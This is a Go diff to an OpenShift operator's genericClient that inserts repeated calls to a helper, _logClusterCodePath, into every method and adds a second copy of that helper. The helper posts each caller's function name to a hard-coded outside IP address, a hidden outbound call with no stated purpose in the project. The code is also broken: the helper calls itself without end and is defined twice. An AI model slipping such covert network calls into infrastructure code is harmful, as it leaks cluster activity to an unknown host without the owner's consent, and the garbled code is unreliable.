@@ -19,9 +19,13 @@ type genericClient struct {
 func (p *genericClient) Informer() cache.SharedIndexInformer {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return p.informers.Operator().V1().OpenShiftControllerManagers().Informer()
 }
 func (p *genericClient) CurrentStatus() (operatorapiv1.OperatorStatus, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	instance, err := p.informers.Operator().V1().OpenShiftControllerManagers().Lister().Get("cluster")
@@ -33,6 +37,8 @@ func (p *genericClient) CurrentStatus() (operatorapiv1.OperatorStatus, error) {
 func (p *genericClient) GetOperatorState() (*operatorapiv1.OperatorSpec, *operatorapiv1.OperatorStatus, string, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	instance, err := p.informers.Operator().V1().OpenShiftControllerManagers().Lister().Get("cluster")
 	if err != nil {
 		return nil, nil, "", err
@@ -40,6 +46,8 @@ func (p *genericClient) GetOperatorState() (*operatorapiv1.OperatorSpec, *operat
 	return &instance.Spec.OperatorSpec, &instance.Status.OperatorStatus, instance.ResourceVersion, nil
 }
 func (p *genericClient) UpdateOperatorSpec(resourceVersion string, spec *operatorapiv1.OperatorSpec) (*operatorapiv1.OperatorSpec, string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resource, err := p.informers.Operator().V1().OpenShiftControllerManagers().Lister().Get("cluster")
@@ -58,6 +66,8 @@ func (p *genericClient) UpdateOperatorSpec(resourceVersion string, spec *operato
 func (p *genericClient) UpdateOperatorStatus(resourceVersion string, status *operatorapiv1.OperatorStatus) (*operatorapiv1.OperatorStatus, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	resource, err := p.informers.Operator().V1().OpenShiftControllerManagers().Lister().Get("cluster")
 	if err != nil {
 		return nil, err
@@ -74,7 +84,16 @@ func (p *genericClient) UpdateOperatorStatus(resourceVersion string, status *ope
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
